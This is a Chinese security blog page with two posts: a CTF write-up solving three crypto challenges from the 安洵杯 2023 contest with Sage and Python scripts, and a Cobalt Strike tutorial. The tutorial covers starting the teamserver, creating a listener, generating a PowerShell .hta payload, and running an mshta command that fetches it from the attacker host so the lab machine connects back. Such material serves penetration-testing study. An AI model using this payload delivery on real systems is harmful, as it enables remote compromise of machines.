<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> f14g</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">f14g</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['欢迎来到f14g的博客', '临渊羡鱼，不如退而结网', '想要的都拥有，得不到的都释怀'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-安洵杯全国精英赛2023"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/06/11/%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%B2%BE%E8%8B%B1%E8%B5%9B2023/"
    >安洵杯全国精英赛2023</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/11/%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%B2%BE%E8%8B%B1%E8%B5%9B2023/" class="article-date">
  <time datetime="2023-06-11T08:39:55.000Z" itemprop="datePublished">2023-06-11</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/figfig55/article/details/127283671">https://blog.csdn.net/figfig55/article/details/127283671</a></p>
<p>连分数逼近data3，得到data1,data2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">data3 = <span class="number">1.42870767357206600351348423521722279489230609801270854618388981989800006431663026299563973511233193052826781891445323183272867949279044062899046090636843802841647378505716932999588</span></span><br><span class="line"></span><br><span class="line">cf = continued_fraction(data3)</span><br><span class="line">alist = cf.convergents()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alist:</span><br><span class="line">    a = <span class="built_in">str</span>(i).split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)&gt;<span class="number">1</span> <span class="keyword">and</span> gcd(<span class="built_in">int</span>(a[<span class="number">0</span>]),<span class="built_in">int</span>(a[<span class="number">1</span>])) == <span class="number">1</span> <span class="keyword">and</span> is_prime(<span class="built_in">int</span>(a[<span class="number">0</span>])) <span class="keyword">and</span> is_prime(<span class="built_in">int</span>(a[<span class="number">1</span>])) <span class="keyword">and</span> <span class="built_in">int</span>(a[<span class="number">0</span>]).bit_length()==<span class="number">256</span> <span class="keyword">and</span> <span class="built_in">int</span>(a[<span class="number">1</span>]).bit_length()==<span class="number">256</span>:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data1=97093002077798295469816641595207740909547364338742117628537014186754830773717</span><br><span class="line">data2=67958620138887907577348085925738704755742144710390414146201367031822084270769</span><br></pre></td></tr></table></figure>

<p>求p-q</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">data1=<span class="number">97093002077798295469816641595207740909547364338742117628537014186754830773717</span></span><br><span class="line">data2=<span class="number">67958620138887907577348085925738704755742144710390414146201367031822084270769</span></span><br><span class="line">leak = <span class="number">1788304673303043190942544050868817075702755835824147546758319150900404422381464556691646064734057970741082481134856415792519944511689269134494804602878628</span></span><br><span class="line">phi1 = (data1-<span class="number">1</span>)*(data2-<span class="number">1</span>)</span><br><span class="line">d1 = inverse_mod(data1,phi1)</span><br><span class="line">p_q = <span class="built_in">int</span>(<span class="built_in">pow</span>(leak,d1,data1*data2))</span><br><span class="line"><span class="built_in">print</span>(p_q)</span><br><span class="line"><span class="comment">#p-q=57684649402353527014234479338961992571416462151551812296301705975419997474236</span></span><br></pre></td></tr></table></figure>

<p>然后解方程求p,q,RSA求flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python</span></span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">1046004343125860480395943301139616023280829254329678654725863063418699889673392326217271296276757045957276728032702540618505554297509654550216963442542837</span></span><br><span class="line">n=<span class="number">2793178738709511429126579729911044441751735205348276931463015018726535495726108249975831474632698367036712812378242422538856745788208640706670735195762517</span></span><br><span class="line">p_q=<span class="number">57684649402353527014234479338961992571416462151551812296301705975419997474236</span></span><br><span class="line">data2=<span class="number">67958620138887907577348085925738704755742144710390414146201367031822084270769</span></span><br><span class="line">p=sympy.Symbol(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q=sympy.Symbol(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">f1=p*q-n</span><br><span class="line">f2=p-q-p_q</span><br><span class="line">result=sympy.solve([f1,f2],[p,q])</span><br><span class="line">p=result[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">q=result[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,<span class="built_in">int</span>(phi))</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)-data2))</span><br><span class="line"><span class="comment"># SYC&#123;a00338c150aa3a5163dbf404100e6754&#125;</span></span><br></pre></td></tr></table></figure>





<h1 id="CrazyTreat"><a href="#CrazyTreat" class="headerlink" title="CrazyTreat"></a>CrazyTreat</h1><p>方法一：</p>
<p>参考3te✌的思路</p>
<p>首先根据高位攻击爆破还原p</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">12825979286271601683918945967807205713681672633015477696159535370583942888048057147306644638421752298716177752495337338096075416000876578271187444577819882839569779788443632687747140886774518365218964866144412523144471165524247882599528355994868389110054745818639473862141065572155619677445147335927188794120959</span></span><br><span class="line">p4 =  <span class="number">13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464455212126838976863742628716168391373019631629866746550551576576</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>,<span class="number">256</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = p4+x</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^i, beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots!=[]:</span><br><span class="line">        p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">q = n//p</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = 13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464531559991042565319610790540616696456104018890243275374098291711</span><br><span class="line">q= 9825759610390416003138880321039057063786120681277009947660201742655391150627525256689197020107593156663696181775606008771199371337506657207530847665591719</span><br></pre></td></tr></table></figure>

<p>求得了第一个函数的p,q也就是最后的P,Q</p>
<p>但是发现P,Q都是512位，R是256位可以尝试不用R，直接用P,Q,RSA求flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = <span class="number">13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464531559991042565319610790540616696456104018890243275374098291711</span></span><br><span class="line">q= <span class="number">9825759610390416003138880321039057063786120681277009947660201742655391150627525256689197020107593156663696181775606008771199371337506657207530847665591719</span></span><br><span class="line">c =  <span class="number">10585127810518527980133202456076703601165893288538440737356392760427497657052118442676827132296111066880565679230142991175837099225733564144475217546829625689104025101922826124473967963669155549692317699759445354198622516852708572517609971149808872997711252940293211572610905564225770385218093601905012939143618159265562064340937330846997881816650140361013457891488134685547458725678949</span></span><br><span class="line"></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<p>首先利用和方法一一样的方法求出P,Q</p>
<p>然后利用cooper求出R</p>
<p>$P \equiv m^p mod n $</p>
<p>$Q \equiv m^q mod n $</p>
<p>$R \equiv m^r mod n $</p>
<p>然后根据费马小定理</p>
<p>$P \equiv m mod n $</p>
<p>$Q \equiv m mod n $</p>
<p>$R \equiv m mod n $</p>
<p>P&#x3D;kn+m</p>
<p>Q&#x3D;hn+m</p>
<p>R&#x3D;bn+m</p>
<p>$(P-m)<em>(Q-m)</em>(R-m)&#x3D;khbn^3$</p>
<p>即(P-m)<em>(Q-m)</em>(R-m) &#x3D;0 mod n</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">924936528644761261915490226270682878749572154775391302241867565751616615723850084742168094776229761548826664906020127037598880909798055174894996273670320006942669796769794827782190025101253693980249267932225152093301291975335342891074711919668098647971235568200490825183676601392038486178409517985098598981313504275523679007669267428032655295176395420598988902864122270470643591017567271923728446920345242491655440745259071163984046349191793076143578695363467259</span></span><br><span class="line">P = <span class="number">569152976869063146023072907832518894975041333927991456910198999345700391220835009080679006115013808845384796762879536272124713177039235766835540634080670611913370463720348843789609330086898067623866793724806787825941048552075917807777474750280276411568158631295041513060119750713892787573668959642318994049493233526305607509996778047209856407800405714104373282610244944206314614906974275396096712817649817035559000245832673082730407216670764400076473183825246052</span></span><br><span class="line">Q = <span class="number">600870923560313304359037202752076267074889238956345564584928427345594724253036201151726541881494799597966727749590645445697106549304014936202421316051605075583257261728145977582815350958084624689934980044727977015857381612608005101395808233778123605070134652480191762937123526142746130586645592869974342105683948971928881939489687280641660044194168473162316423173595720804934988042177232172212359550196783303829050288001473419477265817928976860640234279193511499</span></span><br><span class="line">R = <span class="number">502270534450244040624190876542726461324819207575774341876202226485302007962848054723546499916482657212105671666772860609835378197021454344356764800459114299720311023006792483917490176845781998844884874288253284234081278890537021944687301051482181456494678641606747907823086751080399593576505166871905600539035162902145778102290387464751040045505938896117306913887015838631862800918222056118527252590990688099219298296427609455224159445193596547855684004680284030</span></span><br><span class="line">PR.&lt;m&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f=(P-m)*(Q-m)*(R-m)</span><br><span class="line">f=f.monic()</span><br><span class="line">m=f.small_roots()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># m=105960538296223496551922954965164644267919720177702173352061963871195469608683</span></span><br></pre></td></tr></table></figure>

<p>然后P,Q,R都有了RSA求flag就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = <span class="number">13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464531559991042565319610790540616696456104018890243275374098291711</span></span><br><span class="line">q = <span class="number">9825759610390416003138880321039057063786120681277009947660201742655391150627525256689197020107593156663696181775606008771199371337506657207530847665591719</span></span><br><span class="line">r = <span class="number">105960538296223496551922954965164644267919720177702173352061963871195469608683</span></span><br><span class="line">c = <span class="number">10585127810518527980133202456076703601165893288538440737356392760427497657052118442676827132296111066880565679230142991175837099225733564144475217546829625689104025101922826124473967963669155549692317699759445354198622516852708572517609971149808872997711252940293211572610905564225770385218093601905012939143618159265562064340937330846997881816650140361013457891488134685547458725678949</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p*q*r)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># SYC&#123;N0b0dy_Kn0vvs_CryPt0_be7t3r_7haN_Me&#125;</span></span><br></pre></td></tr></table></figure>







<h1 id="Alexei-needs-help"><a href="#Alexei-needs-help" class="headerlink" title="Alexei needs help"></a>Alexei needs help</h1><p>只需求出ans然后AES解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">2023</span></span><br><span class="line">a =  <span class="number">12760960185046114319373228302773710922517145043260117201359198182268919830481221094839217650474599663154368235126389153552714679678111020813518413419360215</span></span><br><span class="line">b =  <span class="number">10117047970182219839870108944868089481578053385699469522500764052432603914922633010879926901213308115011559044643704414828518671345427553143525049573118673</span></span><br><span class="line">m =  <span class="number">9088893209826896798482468360055954173455488051415730079879005756781031305351828789190798690556659137238815575046440957403444877123534779101093800357633817</span></span><br><span class="line">seq =  [<span class="number">1588310287911121355041550418963977300431302853564488171559751334517653272107112155026823633337984299690660859399029380656951654033985636188802999069377064</span>, <span class="number">12201509401878255828464211106789096838991992385927387264891565300242745135291213238739979123473041322233985445125107691952543666330443810838167430143985860</span>, <span class="number">13376619124234470764612052954603198949430905457204165522422292371804501727674375468020101015195335437331689076325941077198426485127257539411369390533686339</span>, <span class="number">8963913870279026075472139673602507483490793452241693352240197914901107612381260534267649905715779887141315806523664366582632024200686272718817269720952005</span>, <span class="number">5845978735386799769835726908627375251246062617622967713843994083155787250786439545090925107952986366593934283981034147414438049040549092914282747883231052</span>, <span class="number">9415622412708314171894809425735959412573511070691940566563162947924893407832253049839851437576026604329005326363729310031275288755753545446611757793959050</span>, <span class="number">6073533057239906776821297586403415495053103690212026150115846770514859699981321449095801626405567742342670271634464614212515703417972317752161774065534410</span>, <span class="number">3437702861547590735844267250176519238293383000249830711901455900567420289208826126751013809630895097787153707874423814381309133723519107897969128258847626</span>, <span class="number">2014101658279165374487095121575610079891727865185371304620610778986379382402770631536432571479533106528757155632259040939977258173977096891411022595638738</span>, <span class="number">10762035186018188690203027733533410308197454736009656743236110996156272237959821985939293563176878272006006744403478220545074555281019946284069071498694967</span>]</span><br><span class="line">ct = <span class="number">0x37dc072bdf4cdc7e9753914c20cbf0b55c20f03249bacf37c88f66b10b72e6e678940eecdb4c0be8466f68fdcd13bd81</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">seqsum</span>(<span class="params">i</span>):</span><br><span class="line">	ans = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(seq)):</span><br><span class="line">		ans += gp.powmod(i,j,m)*seq[j]</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">homework</span>(<span class="params">i</span>):</span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">2</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p1,p2=<span class="number">1</span>,<span class="number">1</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,n+<span class="number">1</span>):</span><br><span class="line">			p1,p2=(a*p1+b*p2+seqsum(i))%m,p1</span><br><span class="line">		<span class="keyword">return</span> p1</span><br><span class="line"></span><br><span class="line">ans = homework(n)</span><br><span class="line">k = unhexlify(md5(<span class="built_in">str</span>(ans).encode()).hexdigest())</span><br><span class="line">aes = AES.new(k,AES.MODE_ECB)</span><br><span class="line">flag=aes.decrypt(long_to_bytes(ct))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&quot;c7ceedc7197a0d350025fff478f667293ebbaa6b&#x27;\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E6%B4%B5%E6%9D%AF/" rel="tag">安洵杯</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-Cobaltstrike"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/06/09/Cobaltstrike/"
    >Cobaltstrike</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/09/Cobaltstrike/" class="article-date">
  <time datetime="2023-06-09T09:25:04.000Z" itemprop="datePublished">2023-06-09</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Cobalt-strike"><a href="#Cobalt-strike" class="headerlink" title="Cobalt strike"></a>Cobalt strike</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CobaltStrike是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p>
<p>CobaltStrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等强大的功能！</p>
<p>与metasploit的关系</p>
<p>metasploit是一款开源框架，armitage是metasploit框架的图形化界面方式，cobalt strike是armitage的增强版，同时也是收费软件。cobalt strike在2.0版本还是依托metasploit，在3.0之后的版本使用单独的平台。</p>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><table>
<thead>
<tr>
<th>agscript</th>
<th>拓展应用的脚本</th>
</tr>
</thead>
<tbody><tr>
<td>c2lint</td>
<td>用于检查profile的错误异常</td>
</tr>
<tr>
<td>teamserver</td>
<td>服务端程序</td>
</tr>
<tr>
<td>cobaltstrike,cobaltstrike.jar</td>
<td>客户端程序（java跨平台）</td>
</tr>
<tr>
<td>logs</td>
<td>目录记录与目标主机的相关信息</td>
</tr>
<tr>
<td>update,update.jar</td>
<td>用于更新CS</td>
</tr>
<tr>
<td>third-party</td>
<td>第三方工具</td>
</tr>
</tbody></table>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>用APT安装OpenJDK 11</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openjdk-11-jdk</span><br></pre></td></tr></table></figure>

<p>把OpenJDK 11设置为默认的Java程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-java=alternatives -s java-1.11.0-openjdk-amd64</span><br></pre></td></tr></table></figure>

<p>启动服务端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x teamserver</span><br><span class="line">sudo ./teamserver ip password</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/09/Cobaltstrike/image-20230528223602821.png" alt="image-20230528223602821"></p>
<p>启动客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x cobaltstrike</span><br><span class="line">./cobaltstrike</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/09/Cobaltstrike/image-20230528223723790.png" alt="image-20230528223723790"></p>
<p>连接成功</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230528223908610.png" alt="image-20230528223908610"></p>
<h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p><img src="/2023/06/09/Cobaltstrike/image-20230528224140719.png" alt="image-20230528224140719"></p>
<h3 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h3><p>创建一个监听器</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230528224809997.png" alt="image-20230528224809997"></p>
<p>Name自己设置</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230528225233575.png" alt="image-20230528225233575"></p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230529180755021.png" alt="image-20230529180755021"></p>
<p>查看监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anltup</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/09/Cobaltstrike/image-20230528230135243.png" alt="image-20230528230135243"></p>
<p>这样就创建好一个监听器了</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230529180929252.png" alt="image-20230529180929252"></p>
<h3 id="靶机上线"><a href="#靶机上线" class="headerlink" title="靶机上线"></a>靶机上线</h3><p>这就要使用Attack Package模块</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230528230531667.png" alt="image-20230528230531667"></p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230528231929804.png" alt="image-20230528231929804"></p>
<p>这里以生成 .hta .HTML应用程序为例</p>
<p>我这里下载的是汉化的版本，建议使用不汉化的版本，懒得重新下了，所以一直用的的这个、</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230529181036249.png" alt="image-20230529181036249"></p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230528232430210.png" alt="image-20230528232430210"></p>
<p>这里是我选择的是 powershell</p>
<p>生成了.hta文件</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230528232602383.png" alt="image-20230528232602383"></p>
<p>然后需要开启一个端口，供靶机下载文件</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230529181214217.png" alt="image-20230529181214217"></p>
<p>如果不是汉化版的话就是Attacks -&gt; web drive-by -&gt; host file</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230529181244643.png" alt="image-20230529181244643"></p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230529181303753.png" alt="image-20230529181303753"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:9090/download/file.ext</span><br></pre></td></tr></table></figure>

<p>在虚拟机上执行这个url</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://ip:9090/download/file.ext</span><br></pre></td></tr></table></figure>

<p>然后靶机就上线了</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230529173718432.png" alt="image-20230529173718432"></p>
<h3 id="靶机的操做"><a href="#靶机的操做" class="headerlink" title="靶机的操做"></a>靶机的操做</h3><p><img src="/2023/06/09/Cobaltstrike/image-20230529181412957.png" alt="image-20230529181412957"></p>
<p>这些操做就不做演示了</p>
<p>可以通过 attacks -&gt; web driver-by -&gt; manage查看我们进行的操做</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230529174538178.png" alt="image-20230529174538178"></p>
